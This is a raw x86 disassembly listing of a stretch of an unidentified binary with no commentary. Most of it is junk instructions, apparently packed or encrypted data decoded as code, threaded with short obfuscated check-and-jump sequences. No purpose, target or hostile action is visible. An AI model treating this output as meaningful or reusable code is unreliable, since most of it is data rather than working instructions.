  40cb3d:	imul   ebx,DWORD PTR [edx+0x7e3e572b],0x2
  40cb44:	xor    dh,dl
  40cb46:	outs   dx,DWORD PTR ds:[esi]
  40cb47:	cmp    BYTE PTR [eax],dh
  40cb49:	cmp    eax,DWORD PTR [esi+0x4aa5615e]
  40cb4f:	rcl    DWORD PTR [esi+ebx*8],cl
  40cb52:	xchg   ebp,eax
  40cb53:	push   0x16724a97
  40cb58:	push   es
  40cb59:	sub    eax,0x1010a8ba
  40cb5e:	aam    0x59
  40cb60:	or     esp,DWORD PTR [ebx-0x71]
  40cb63:	pop    edi
  40cb64:	es iret 
  40cb66:	shr    BYTE PTR [esi+0x52],1
  40cb69:	add    ch,bl
  40cb6b:	add    BYTE PTR cs:[ebp-0x145d6bae],cl
  40cb72:	cmp    dh,BYTE PTR [ebp+0x28020a26]
  40cb78:	mov    eax,0x2030fdea
  40cb7d:	ss xor ah,ch
  40cb80:	outs   dx,DWORD PTR ds:[esi]
  40cb81:	cmc    
  40cb82:	int3   
  40cb83:	(bad)  
  40cb84:	dec    ebx
  40cb85:	inc    eax
  40cb86:	jmp    0x53bc:0x2383c65a
  40cb8d:	xor    ch,bh
  40cb8f:	dec    esi
  40cb90:	or     esi,DWORD PTR ds:0x4513353d
  40cb96:	mov    dh,0xd4
  40cb98:	outs   dx,DWORD PTR ds:[esi]
  40cb99:	test   al,0xb3
  40cb9b:	jae    0x40cbdf
  40cb9d:	add    al,0x1e
  40cb9f:	sub    esi,DWORD PTR [ebx]
  40cba1:	and    BYTE PTR [edi+0x1f4ed797],cl
  40cba7:	xchg   esi,eax
  40cba8:	jnp    0x40cbe8
  40cbaa:	mov    dh,0xcc
  40cbac:	inc    esp
  40cbad:	inc    ecx
  40cbae:	and    eax,esi
  40cbb0:	cdq    
  40cbb1:	push   ss
  40cbb2:	fild   DWORD PTR [eax+0x3c18f32e]
  40cbb8:	in     eax,dx
  40cbb9:	sub    DWORD PTR [edi+0x6df51b7e],eax
  40cbbf:	add    BYTE PTR [edx+0x50],bh
  40cbc2:	push   DWORD PTR [ebp-0x30]
  40cbc5:	push   DWORD PTR [ebp+0xc]
  40cbc8:	call   0x410a7f
  40cbcd:	mov    eax,DWORD PTR [ebp-0x4]
  40cbd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40cbd3:	xor    eax,0x7510854
  40cbd8:	add    eax,ebx
  40cbda:	cmp    ecx,eax
  40cbdc:	jne    0x40cbff
  40cbe2:	mov    eax,DWORD PTR [ebp-0x20]
  40cbe5:	inc    edi
  40cbe6:	cmp    edi,eax
  40cbe8:	jb     0x40c413
  40cbee:	jmp    0x40cc0f
  40cbf3:	mov    eax,DWORD PTR [ebp-0x4]
  40cbf6:	xor    eax,esi
  40cbf8:	add    eax,ebx
  40cbfa:	jmp    0x40e33d
  40cbff:	mov    eax,DWORD PTR [ebp-0x2c]
  40cc02:	movzx  eax,WORD PTR [eax+edi*2]
  40cc06:	mov    ecx,DWORD PTR [ebp-0x14]
  40cc09:	mov    eax,DWORD PTR [ecx+eax*4]
  40cc0c:	mov    DWORD PTR [ebp+0xc],eax
  40cc0f:	mov    eax,DWORD PTR [ebp-0x4]
  40cc12:	mov    ecx,DWORD PTR [ebp-0x8]
  40cc15:	xor    eax,0x7510854
  40cc1a:	add    eax,ebx
  40cc1c:	cmp    ecx,eax
  40cc1e:	jne    0x40cf51
  40cc24:	mov    eax,DWORD PTR [ebp-0x4]
  40cc27:	xor    eax,0x7510854
  40cc2c:	jmp    0x40cbf8
  40cc31:	jmp    0x40cf51
  40cc36:	xchg   BYTE PTR [edi-0x6ff40385],dl
  40cc3c:	adc    DWORD PTR [ebp+0x593a5a78],0x77006562
  40cc46:	and    cl,BYTE PTR [ebx+0x7d7d7e7e]
  40cc4c:	jle    0x40cccc
  40cc4e:	pushf  
  40cc4f:	cwde   
  40cc50:	or     bh,BYTE PTR [ebp+0x4c991690]
  40cc56:	rcl    DWORD PTR [ebx],0xfb
  40cc59:	ss xchg ebp,eax
  40cc5b:	div    BYTE PTR [esp+ebx*1-0x54]
  40cc5f:	sysexit 
  40cc61:	lods   al,BYTE PTR es:[esi]
  40cc63:	jecxz  0x40cc4c
  40cc65:	cmc    
  40cc66:	and    edi,DWORD PTR [esi]
  40cc68:	cs call 0xf9142221
  40cc6e:	mov    esp,0x4d31208b
  40cc73:	into   
  40cc74:	pop    ebp
  40cc75:	or     DWORD PTR [edi],edx
  40cc77:	mov    ebx,DWORD PTR [eax]
  40cc79:	(bad)  
  40cc7a:	fs jecxz 0x40cc62
  40cc7d:	sub    DWORD PTR [ecx+0x3b2194fa],eax
  40cc83:	aas    
  40cc84:	in     eax,0xc0
  40cc86:	or     al,0x4d
  40cc88:	pop    esp
  40cc89:	mov    al,0x2d
  40cc8b:	int3   
  40cc8c:	outs   dx,BYTE PTR ds:[esi]
  40cc8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc8e:	ror    DWORD PTR [edi-0x569232a7],cl
  40cc94:	sub    eax,0x7578a59
  40cc99:	jl     0x40ccdb
  40cc9b:	stos   DWORD PTR es:[edi],eax
  40cc9c:	loopne 0x40cced
  40cc9e:	dec    edx
  40cc9f:	inc    eax
  40cca0:	sbb    esi,DWORD PTR [ebx-0x43]
  40cca3:	pop    esi
  40cca4:	repz sbb eax,0x20cadacd
  40ccaa:	hlt    
  40ccab:	xchg   esp,eax
  40ccac:	pop    es
  40ccad:	mov    ds:0x734aeeb7,eax
  40ccb2:	stos   DWORD PTR es:[edi],eax
  40ccb3:	fidivr WORD PTR [ebx+0x61]
  40ccb6:	(bad)  
  40ccb7:	ret    0xd9dd
  40ccba:	xlat   BYTE PTR ds:[ebx]
  40ccbb:	push   edx
  40ccbc:	adc    BYTE PTR [ebx-0x5560d8e9],cl
  40ccc2:	mov    fs,WORD PTR [ebx-0x43]
  40ccc5:	mov    ebp,0xde630c90
  40ccca:	sbb    al,0xc1
  40cccc:	xlat   BYTE PTR ds:[ebx]
  40cccd:	repnz xor BYTE PTR [edx-0x56],bh
  40ccd1:	dec    edi
  40ccd2:	mov    dh,0x2c
  40ccd4:	js     0x40cd42
  40ccd6:	iret   
  40ccd7:	(bad)  
  40ccd8:	jmp    0x40cce3
  40ccda:	sub    DWORD PTR [edi+0x75],edx
  40ccdd:	and    al,0x58
  40ccdf:	sbb    DWORD PTR [eax+0x63e2ecb2],edi
  40cce5:	loope  0x40ccb8
  40cce7:	inc    esi
  40cce8:	mov    esi,0x88c4b475
  40cced:	and    dh,BYTE PTR [eax+0x7]
  40ccf0:	jmp    0x516f:0xd06e5742
  40ccf7:	loopne 0x40ccd9
  40ccf9:	adc    DWORD PTR ds:[edx+0x19ad4cf6],esp
  40cd00:	das    
  40cd01:	shl    DWORD PTR [edx+0x5786e431],0x59
  40cd08:	and    DWORD PTR ds:0xcc249f05,edx
  40cd0e:	lea    edx,[edx-0x32]
  40cd11:	adc    BYTE PTR [edi+0x3756e2c8],al
  40cd17:	retf   
  40cd18:	or     al,0x1a
  40cd1a:	mov    al,ds:0x21425ae2
  40cd1f:	sbb    BYTE PTR [edx],bl
  40cd21:	xor    BYTE PTR [esi],dh
  40cd23:	inc    edx
  40cd24:	mov    dh,0x6a
  40cd26:	ds pushf 
  40cd28:	jno    0x40cd57
  40cd2a:	rol    DWORD PTR [ebp-0x44],1
  40cd2d:	cdq    
  40cd2e:	lea    edx,[ebp+0x61]
  40cd31:	push   esi
  40cd32:	pop    edx
  40cd33:	jge    0x40ccec
  40cd35:	nop
  40cd36:	cmp    DWORD PTR [edi-0x5649521a],0x61262322
  40cd40:	push   ds
  40cd41:	sub    DWORD PTR [edx],ebp
  40cd43:	sbb    dh,BYTE PTR [ebx]
  40cd45:	mov    ds:0xa45d077f,eax
  40cd4a:	mul    ah
  40cd4c:	jns    0x40cce8
  40cd4e:	pop    ebx
  40cd4f:	cmp    eax,0x28346457
  40cd54:	test   DWORD PTR [ebx-0x720b3481],eax
  40cd5a:	cwde   
  40cd5b:	or     BYTE PTR [ebp-0x1e],bh
  40cd5e:	xor    edx,ecx
  40cd60:	xchg   esi,eax
  40cd61:	loop   0x40cd42
  40cd63:	jmp    0x40cd72
  40cd65:	xchg   esi,eax
  40cd66:	cs sub bh,al
  40cd69:	dec    ebx
  40cd6a:	stos   BYTE PTR es:[edi],al
  40cd6b:	cld    
  40cd6c:	push   ecx
  40cd6d:	rcr    DWORD PTR ds:0xc8d097b7,0x23
  40cd74:	cmp    al,0x10
  40cd76:	sub    BYTE PTR [eax+0x69],dl
  40cd79:	mov    ebx,0x27835881
  40cd7e:	gs jnp 0x40cde2
  40cd81:	cmp    eax,0x6d
  40cd84:	mov    bh,0x87
  40cd86:	sub    ecx,DWORD PTR [esi]
  40cd88:	call   0xb4cb:0xce894a4b
  40cd8f:	sub    dl,BYTE PTR [edi+0x3d]
  40cd92:	mov    edi,0xb5f8ce85
  40cd97:	fld    QWORD PTR [ecx+0x32c120bf]
  40cd9d:	xlat   BYTE PTR ds:[ebx]
  40cd9e:	imul   edi,DWORD PTR gs:[esi-0x5da99806],0xffffff8e
  40cda6:	mov    WORD PTR [ecx-0x74],ss
  40cda9:	fidivr DWORD PTR [edx]
  40cdab:	into   
  40cdac:	outs   dx,DWORD PTR ds:[esi]
  40cdad:	sub    BYTE PTR [eax+0x66511e73],dl
  40cdb3:	xor    BYTE PTR [ebp-0x1],bl
  40cdb6:	xchg   ebp,eax
  40cdb7:	rcl    DWORD PTR [ebx],0xce
  40cdba:	xchg   DWORD PTR [ebx+0x75],esi
  40cdbd:	int    0x7
  40cdbf:	xor    al,0x8f
  40cdc1:	mov    ebx,0xa76234a0
  40cdc6:	jnp    0x40cdb6
  40cdc8:	pop    ss
  40cdc9:	pop    edi
  40cdca:	sti    
  40cdcb:	mov    dl,0xf0
  40cdcd:	cmp    al,0xc3
  40cdcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdd0:	jmp    0x40cd72
  40cdd2:	loopne 0x40cdba
  40cdd4:	jae    0x40ce25
  40cdd6:	jbe    0x40ce12
  40cdd8:	xchg   esp,eax
  40cdd9:	dec    ebp
  40cdda:	(bad)  
  40cddb:	xlat   BYTE PTR ds:[ebx]
  40cddc:	sub    DWORD PTR [ebx-0x56],ebx
  40cddf:	adc    BYTE PTR [eax+0x4fe13224],0xbe
  40cde6:	outs   dx,DWORD PTR ds:[esi]
  40cde7:	add    DWORD PTR [edi],edx
  40cde9:	ds xchg edi,eax
  40cdeb:	or     BYTE PTR [edi+0x31],bh
  40cdee:	(bad)  
  40cdef:	adc    ah,cl
  40cdf1:	mov    ebp,DWORD PTR [ebx]
  40cdf3:	test   eax,0x90a97155
  40cdf8:	stos   DWORD PTR es:[edi],eax
  40cdf9:	jmp    0x6c609cc5
  40cdfe:	into   
  40cdff:	mov    al,ds:0xeafe3f00
  40ce04:	cmp    eax,0x80b82e0
  40ce09:	xchg   edx,ebx
  40ce0b:	(bad)
  40ce0e:	fsub   DWORD PTR [ecx]
  40ce10:	push   esp
  40ce11:	out    dx,al
  40ce12:	or     edx,DWORD PTR [eax+edi*1]
  40ce15:	test   eax,0xe954b267
  40ce1a:	add    ch,BYTE PTR [ebp-0x60]
  40ce1d:	jno    0x40ce42
  40ce1f:	mov    al,0xb5
  40ce21:	or     ebx,DWORD PTR [eax+ecx*4+0x7f]
  40ce25:	lods   eax,DWORD PTR ds:[esi]
  40ce26:	rol    BYTE PTR [ecx+0x28],cl
  40ce29:	fidivr DWORD PTR [ebp-0x5f]
  40ce2c:	scas   eax,DWORD PTR es:[edi]
  40ce2d:	repnz pop esp
  40ce2f:	sbb    eax,0xcb977b5f
  40ce34:	jl     0x40ce1a
  40ce36:	mov    esp,0x921d7f97
  40ce3b:	jle    0x40ce60
  40ce3d:	adc    dh,bl
  40ce3f:	ret    0x7730
  40ce42:	adc    al,0x1f
  40ce44:	test   eax,0xdaabd842
  40ce49:	or     al,0x6e
  40ce4b:	test   al,0x95
  40ce4d:	inc    edi
  40ce4e:	inc    esp
  40ce4f:	pop    es
  40ce50:	gs fs jbe 0x40ce30
  40ce54:	mov    ebp,0xc7d522e9
  40ce59:	out    dx,al
  40ce5a:	pop    edx
  40ce5b:	xor    ecx,ebp
  40ce5d:	(bad)  
  40ce5e:	cmc    
  40ce5f:	inc    edi
  40ce60:	sbb    edi,DWORD PTR [ecx-0x54]
  40ce63:	add    ecx,esp
  40ce65:	add    esp,eax
  40ce67:	fbstp  TBYTE PTR [edi+0x3d]
  40ce6a:	(bad)  
  40ce6b:	and    edi,DWORD PTR [ecx]
  40ce6d:	add    eax,DWORD PTR [eax]
  40ce6f:	sbb    BYTE PTR [ecx-0x4],0x5e
  40ce73:	fst    st(7)
  40ce75:	lds    edi,FWORD PTR [ebx+0x5b]
  40ce78:	jl     0x40cec9
  40ce7a:	ficomp DWORD PTR [ebp+0x26]
  40ce7d:	push   ebp
  40ce7e:	(bad)  
  40ce7f:	(bad)  [edi]
  40ce81:	xchg   edi,eax
  40ce82:	inc    eax
  40ce83:	bound  esp,QWORD PTR [edx]
  40ce85:	fs inc edx
  40ce87:	jg     0x40ced8
  40ce89:	call   eax
  40ce8b:	lahf   
  40ce8c:	pushf  
  40ce8d:	mov    BYTE PTR [bp+0x4771],bh
  40ce92:	adc    eax,0xc3b5f080
  40ce97:	mov    al,0x62
  40ce99:	popa   
  40ce9a:	push   DWORD PTR [edi-0x45999ba2]
  40cea0:	dec    ebp
  40cea1:	and    eax,0xf64e1a38
  40cea6:	mov    esi,0x738d68a6
  40ceab:	fld    DWORD PTR [ebx]
  40cead:	mov    ds:0x196a3770,eax
  40ceb2:	xchg   ebx,eax
  40ceb3:	mov    ch,0xcb
  40ceb5:	out    0x4,al
  40ceb7:	mov    edx,0xfe1dbe71
  40cebc:	push   cs
  40cebd:	add    BYTE PTR [ebp+0x73],ah
  40cec0:	sahf   
  40cec1:	arpl   WORD PTR [ebp+0x136efc9],sp
  40cec7:	ficomp WORD PTR [edx]
  40cec9:	ret    0x5ca6
  40cecc:	aaa    
  40cecd:	not    DWORD PTR [ebx-0x6bdf5dbd]
  40ced3:	ins    DWORD PTR es:[edi],dx
  40ced4:	fistp  DWORD PTR [edx+0x1535d008]
  40ceda:	sub    al,0x3b
  40cedc:	mov    eax,0x3f04412f
  40cee1:	jg     0x40ce8c
  40cee3:	push   ds
  40cee4:	fist   DWORD PTR [ebp-0x66]
  40cee7:	out    dx,al
  40cee8:	jmp    0xec7629ff
  40ceed:	mov    ds:0x43686669,eax
  40cef2:	mov    ds:0x70a5e724,eax
  40cef7:	pop    ss
  40cef8:	pop    eax
  40cef9:	cmp    dh,BYTE PTR [eax+0x6ba6f9f2]
  40ceff:	pop    es
  40cf00:	mov    bh,0x7c
  40cf02:	loope  0x40ceda
  40cf04:	add    al,0x6c
  40cf06:	or     ebx,DWORD PTR [eax]
  40cf08:	test   BYTE PTR [edi],dh
  40cf0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf0b:	rcr    cl,0x52
  40cf0e:	and    ebp,DWORD PTR [ecx-0x25]
  40cf11:	imul   esi,DWORD PTR [ebp+0x6f6758d5],0xf
  40cf18:	inc    ebp
  40cf19:	popa   
  40cf1a:	mov    DWORD PTR [esp+esi*8+0x7c742260],edi
  40cf21:	jb     0x40cf09
  40cf23:	les    esi,FWORD PTR [edx+0x176f153e]
  40cf29:	fcomp  DWORD PTR [ebx+0x73]
  40cf2c:	in     eax,0xa0
  40cf2e:	retf   0xb105
  40cf31:	or     ah,bl
  40cf33:	dec    edx
  40cf34:	retf   
  40cf35:	mov    ah,0x81
  40cf37:	add    al,al
  40cf39:	pop    edx
  40cf3a:	sub    eax,0xecd01bc5
  40cf3f:	imul   DWORD PTR [esi]
  40cf41:	pop    es
  40cf42:	iret   
  40cf43:	push   ebx
  40cf44:	in     al,dx
  40cf45:	push   esp
  40cf46:	aad    0x28
  40cf48:	data16 data16 jmp 0x40cf56
  40cf4c:	mov    eax,0x2f4aca5d
  40cf51:	mov    eax,DWORD PTR [ebp+0xc]
  40cf54:	add    eax,DWORD PTR [ebp+0x8]
  40cf57:	mov    DWORD PTR [ebp-0x10],eax
  40cf5a:	mov    eax,DWORD PTR [ebp-0x1c]
  40cf5d:	test   eax,eax
  40cf5f:	je     0x40dfcf
  40cf65:	mov    DWORD PTR [ebp-0x24],esi
  40cf68:	push   0xb
  40cf6a:	pop    ecx
  40cf6b:	push   0x5
  40cf6d:	dec    ecx
  40cf6e:	jmp    0x40d28e
  40cf73:	test   DWORD PTR [ebx],ebx
  40cf75:	jnp    0x40cfa2
  40cf77:	mov    eax,ds:0x98b1b52b
  40cf7c:	xchg   ecx,eax
  40cf7d:	rcr    dl,0x47
  40cf80:	jp     0x40cf79
  40cf82:	ret    
  40cf83:	and    DWORD PTR [esi+0x7d7d7e7e],edx
  40cf89:	jle    0x40d009
  40cf8b:	mov    dl,0x34
  40cf8d:	(bad)  
  40cf8e:	fsubr  st,st(5)
  40cf90:	xor    DWORD PTR [edx+0x51],0xffffffd9
  40cf94:	test   eax,0x4ffa21f5
  40cf99:	repz pop edx
  40cf9b:	push   ebp
  40cf9c:	rcl    DWORD PTR ds:[ecx-0x1ae3d86e],1
  40cfa3:	jbe    0x40d012
  40cfa5:	daa    
  40cfa6:	jecxz  0x40cfb9
  40cfa8:	push   0x4aa238ef
  40cfad:	mov    eax,DWORD PTR [ebx-0x2b686d51]
  40cfb3:	jmp    0x40cf54
  40cfb5:	push   ss
  40cfb6:	adc    DWORD PTR [ebx-0x10],ecx
  40cfb9:	inc    edx
  40cfba:	test   DWORD PTR [esi],ebx
  40cfbc:	not    DWORD PTR [ebp+0x74c5d7ce]
  40cfc2:	jb     0x40d01a
  40cfc4:	jl     0x40cfcb
  40cfc6:	jl     0x40cfd1
  40cfc8:	mov    cs:0xd0c54950,eax
  40cfce:	adc    BYTE PTR [ebx-0x20],ch
  40cfd1:	retf   
  40cfd2:	lahf   
  40cfd3:	inc    ebx
  40cfd4:	out    dx,eax
  40cfd5:	xchg   esi,eax
  40cfd6:	fdiv   DWORD PTR ds:[edi-0x686201b5]
  40cfdd:	xchg   ebp,eax
  40cfde:	inc    BYTE PTR [ecx-0x45]
  40cfe1:	fmul   QWORD PTR [esi]
  40cfe3:	sub    ah,BYTE PTR [esi]
  40cfe5:	and    edx,eax
  40cfe7:	pop    esp
  40cfe8:	or     dl,0x65
  40cfeb:	test   al,0xdb
  40cfed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfee:	fsub   QWORD PTR [edx]
  40cff0:	dec    edi
  40cff1:	lods   eax,DWORD PTR ds:[esi]
  40cff2:	(bad)  
  40cff3:	sbb    al,0x22
  40cff5:	ins    DWORD PTR es:[edi],dx
  40cff6:	and    al,cl
  40cff8:	xor    ecx,esp
  40cffa:	add    eax,0x82f001d2
  40cfff:	int3   
  40d000:	jae    0x40cfd6
  40d002:	ss pushw 0xb26d
  40d007:	mov    esi,0x89f3c868
  40d00c:	cmc    
  40d00d:	add    BYTE PTR [edi+edx*4],dh
  40d010:	retf   
  40d011:	cmc    
  40d012:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d013:	repnz push esp
  40d015:	dec    edi
  40d016:	fmul   QWORD PTR [edi+0x34]
  40d019:	mov    esp,0xb25a613f
  40d01e:	jp     0x40cfda
  40d020:	dec    edi
  40d021:	and    DWORD PTR [ecx+0x54493609],edx
  40d027:	jae    0x40cfe4
  40d029:	cmp    BYTE PTR [eax+0x36],ah
  40d02c:	cmp    edi,DWORD PTR [eax]
  40d02e:	xor    DWORD PTR [eax-0x6e],ebp
  40d031:	and    bl,BYTE PTR [eax+ebx*8]
  40d034:	sti    
  40d035:	xlat   BYTE PTR ds:[ebx]
  40d036:	jl     0x40d021
  40d038:	push   es
  40d039:	xchg   BYTE PTR [edx-0x6d5c936e],ah
  40d03f:	xor    eax,0x7c585f45
  40d044:	mov    bh,0xf
  40d046:	call   0x68b:0x364cd489
  40d04d:	cdq    
  40d04e:	add    esp,edi
  40d050:	mov    dh,0x96
  40d052:	add    ebx,DWORD PTR [edi+0x4dc8a6fe]
  40d058:	js     0x40d0b8
  40d05a:	sahf   
  40d05b:	fidivr WORD PTR [esi-0x6b98042c]
  40d061:	mov    dh,0x4d
  40d063:	pop    edx
  40d064:	sub    bl,bl
  40d066:	retf   0xc386
  40d069:	loop   0x40d0cf
  40d06b:	shl    DWORD PTR [ebx-0x73026745],0xed
  40d072:	or     DWORD PTR ds:[ecx],esi
  40d075:	or     al,0xbc
  40d077:	xchg   ecx,eax
  40d078:	bnd jp 0x40d038
  40d07b:	aad    0x7c
  40d07d:	xlat   BYTE PTR ds:[ebx]
  40d07e:	or     DWORD PTR [edi],ebx
  40d080:	or     al,0xa9
  40d082:	sbb    DWORD PTR [ebp+0x5e],esi
  40d085:	add    DWORD PTR [edx],ebp
  40d087:	loopne 0x40d00d
  40d089:	adc    dl,dh
  40d08b:	xor    BYTE PTR [edx-0x5f],bh
  40d08e:	aad    0x1c
  40d090:	sti    
  40d091:	xchg   ebx,eax
  40d092:	shr    ebp,cl
  40d094:	test   DWORD PTR [ebx-0x11],edi
  40d097:	test   al,0xc7
  40d099:	popf   
  40d09a:	or     al,0xbc
  40d09c:	les    eax,FWORD PTR [edi-0x5c86f883]
  40d0a2:	mov    dh,0xbd
  40d0a4:	scas   eax,DWORD PTR es:[edi]
  40d0a5:	cli    
  40d0a6:	je     0x40d0fc
  40d0a8:	mov    dl,0xa3
  40d0aa:	or     DWORD PTR [ecx],0x4f06076a
  40d0b0:	and    DWORD PTR [ebx+0x61],edx
  40d0b3:	loop   0x40d068
  40d0b5:	lea    esp,[eax]
  40d0b7:	mov    bl,0x29
  40d0b9:	(bad)  
  40d0ba:	out    dx,al
  40d0bb:	es mov al,bl
  40d0be:	mov    ch,0xce
  40d0c0:	aam    0x1b
  40d0c2:	dec    eax
  40d0c3:	repz cdq 
  40d0c5:	lods   al,BYTE PTR ds:[esi]
  40d0c6:	fcomp  QWORD PTR [eax-0x6f4874eb]
  40d0cc:	popa   
  40d0cd:	pop    ebp
  40d0ce:	push   esi
  40d0cf:	imul   esp,DWORD PTR [ebx+0xbe88264],0x37e73bce
  40d0d9:	push   ss
  40d0da:	leave  
  40d0db:	dec    ebp
  40d0dc:	imul   DWORD PTR [edi+0x2be3e6f2]
  40d0e2:	add    BYTE PTR [ecx-0x4b5bae49],ch
  40d0e8:	jp     0x40d0aa
  40d0ea:	pop    ebx
  40d0eb:	int    0xed
  40d0ed:	lods   al,BYTE PTR ds:[esi]
  40d0ee:	inc    ebx
  40d0ef:	push   ebp
  40d0f0:	mov    bh,0xd4
  40d0f2:	not    BYTE PTR [edi+0x1]
  40d0f5:	jge    0x40d0e0
  40d0f7:	mov    ds:0x538c86c,eax
  40d0fc:	fild   DWORD PTR [ecx+0x3fb1faf9]
  40d102:	jae    0x40d117
  40d104:	inc    BYTE PTR [ebp+0x7f]
  40d107:	mov    esi,0xe7d30744
  40d10c:	out    0x2c,eax
  40d10e:	lods   eax,DWORD PTR ds:[esi]
  40d10f:	fwait
  40d110:	pop    ebx
  40d111:	jns    0x40d10e
  40d113:	stos   BYTE PTR es:[edi],al
  40d114:	and    eax,0x1a45b23a
  40d119:	xor    BYTE PTR [eax],ah
  40d11b:	fcomp  DWORD PTR [edx+edi*2]
  40d11e:	ret    0xb6c3
  40d121:	jno    0x40d10e
  40d123:	jae    0x40d13f
  40d125:	jecxz  0x40d146
  40d127:	xor    DWORD PTR [ecx-0x7f05a085],eax
  40d12d:	sti    
  40d12e:	fnsave [edx+ebp*1-0x7]
  40d132:	jae    0x40d123
  40d134:	jge    0x40d10a
  40d136:	sbb    al,0x5f
  40d138:	adc    al,BYTE PTR [esi-0x3d]
  40d13b:	or     DWORD PTR [ebp+0x7869fd29],esi
  40d141:	mov    al,ds:0x95fc61a3
  40d146:	push   ss
  40d147:	ja     0x40d1a4
  40d149:	xor    BYTE PTR [ebx+0x6c1a2f9e],bh
  40d14f:	inc    edi
  40d150:	aaa    
  40d151:	stos   DWORD PTR es:[edi],eax
  40d152:	pushf  
  40d153:	inc    ecx
  40d154:	dec    edx
  40d155:	dec    esi
  40d156:	dec    ebx
  40d157:	mov    ds:0x83d5a144,al
  40d15c:	vpmacswd xmm1,xmm0,xmm5,xmm5
  40d162:	mov    edx,0x5ca11f26
  40d167:	rcl    ch,1
  40d169:	rol    BYTE PTR [ebx],0x9c
  40d16c:	vpperm ymm7,ymm0,ymm5,ymm1
  40d172:	push   esp
  40d173:	dec    ebp
  40d174:	xchg   ebx,eax
  40d175:	mov    ebx,0x61f7b79d
  40d17a:	in     al,0xec
  40d17c:	sub    DWORD PTR [ebx+0x3d],0x5b
  40d180:	jmp    DWORD PTR [edi+ecx*8-0x3f]
  40d184:	fiadd  WORD PTR [edx]
  40d186:	mov    ebx,0x8190f55
  40d18b:	or     al,0xa
  40d18d:	pop    es
  40d18e:	sub    edx,DWORD PTR [ebx-0x6e389494]
  40d194:	mul    DWORD PTR [ebp+0x42dcaa3]
  40d19a:	xchg   BYTE PTR [esi],bh
  40d19c:	dec    ecx
  40d19d:	push   esp
  40d19e:	mov    ds:0x17dfeb3d,eax
  40d1a3:	xor    al,0x5
  40d1a5:	or     al,bh
  40d1a7:	std    
  40d1a8:	or     BYTE PTR [eax+0x72],bh
  40d1ab:	bound  esi,QWORD PTR [esi+0x1b]
  40d1ae:	xchg   edi,esi
  40d1b0:	loopne 0x40d1b6
  40d1b2:	inc    edi
  40d1b3:	test   al,0x21
  40d1b5:	leave  
  40d1b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1b7:	shr    BYTE PTR [edx+0x2],1
  40d1ba:	xor    al,0x2
  40d1bc:	test   esi,esi
  40d1be:	inc    ecx
  40d1bf:	pop    ds
  40d1c0:	jmp    0x40d159
  40d1c2:	stc    
  40d1c3:	(bad)  
  40d1c5:	icebp  
  40d1c6:	or     BYTE PTR [ecx+eiz*8],dl
  40d1c9:	inc    edi
  40d1ca:	icebp  
  40d1cb:	in     eax,0x23
  40d1cd:	jnp    0x40d178
  40d1cf:	in     eax,0xc
  40d1d1:	cdq    
  40d1d2:	pusha  
  40d1d3:	addr16 mov ebp,0x7b2224f1
  40d1d9:	mov    cl,0x80
  40d1db:	push   eax
  40d1dc:	(bad)  
  40d1dd:	cs pop edx
  40d1df:	mov    bh,0xe8
  40d1e1:	mov    esp,0x38fdebb4
  40d1e6:	mov    ds:0xd7aef1d0,al
  40d1eb:	push   edx
  40d1ec:	jmp    0x38219b2
  40d1f1:	mov    ds,WORD PTR [edx-0x75f73168]
  40d1f7:	push   esp
  40d1f8:	dec    eax
  40d1f9:	leave  
  40d1fa:	fisttp WORD PTR [edi]
  40d1fc:	mov    al,0xb6
  40d1fe:	mov    ebp,0xa70d4de
  40d203:	sub    DWORD PTR [edi+eiz*8],edx
  40d206:	mov    ebp,0xa979f79a
  40d20b:	or     al,0xf2
  40d20d:	fwait
  40d20e:	cmp    al,0x47
  40d210:	dec    ebp
  40d211:	jl     0x40d27a
  40d213:	shr    dh,0xdf
  40d216:	cs xchg ecx,eax
  40d218:	int3   
  40d219:	or     edi,DWORD PTR [esi+0x26]
  40d21c:	call   0xeb16:0x8226c2e
  40d223:	xor    DWORD PTR [edx-0x4d],eax
  40d226:	inc    ecx
  40d227:	inc    esi
  40d229:	add    DWORD PTR [eax+0x71],edx
  40d22c:	push   edi
  40d22d:	mov    edx,0x5d58ec62
  40d232:	cmp    ebx,ecx
  40d234:	cdq    
  40d235:	ss je  0x40d201
  40d238:	sbb    DWORD PTR [edx-0x1a],edx
  40d23b:	mov    ah,0xb3
  40d23d:	jg     0x40d28f
  40d23f:	jmpw   0x7258
  40d243:	push   es
  40d244:	ins    DWORD PTR es:[edi],dx
  40d245:	sbb    al,0x7
  40d247:	and    ch,BYTE PTR [eax+ebp*8]
  40d24a:	dec    esi
  40d24b:	and    BYTE PTR [ecx+0xf],dl
  40d24e:	sub    eax,ebx
  40d250:	mov    dl,BYTE PTR [ebx+0x45]
  40d253:	ds adc al,0x6e
  40d256:	leave  
  40d257:	cwde   
  40d258:	xchg   ebx,eax
  40d259:	push   ds
  40d25a:	scas   eax,DWORD PTR es:[edi]
  40d25b:	mov    bh,0x52
  40d25d:	sbb    DWORD PTR [edx+0x4e],esp
  40d260:	je     0x40d2e1
  40d262:	mov    al,ds:0xc8fe2eb1
  40d267:	or     DWORD PTR [ebp+eax*2+0x1f],edi
  40d26b:	(bad)  
  40d26c:	cwde   
  40d26d:	std    
  40d26e:	inc    edx
  40d26f:	dec    edi
  40d270:	cmc    
  40d271:	jmp    0x40d2c1
  40d273:	out    dx,al
  40d274:	pop    esi
  40d275:	out    dx,al
  40d276:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d278:	les    ecx,FWORD PTR [eax+0x6a5b6e0b]
  40d27e:	ja     0x40d271
  40d280:	lods   eax,DWORD PTR ds:[esi]
  40d281:	cmp    dl,BYTE PTR [ebp+0x18]
  40d284:	mov    ch,0x5d
  40d286:	push   ebp
  40d287:	add    DWORD PTR [ebx],ebp
  40d289:	repnz lods al,BYTE PTR ds:[esi]
  40d28b:	inc    eax
  40d28c:	add    BYTE PTR [ebx+0x2bcb875b],ah
  40d292:	fld    DWORD PTR [edi+0x458b49cb]
  40d298:	in     al,0xf
  40d29a:	scas   eax,DWORD PTR es:[edi]
  40d29b:	shr    DWORD PTR [ebx],0xe0
  40d29e:	mov    DWORD PTR [ebp-0x24],esp
  40d2a1:	mov    eax,DWORD PTR [ebp-0x4]
  40d2a4:	mov    ecx,0x7510854
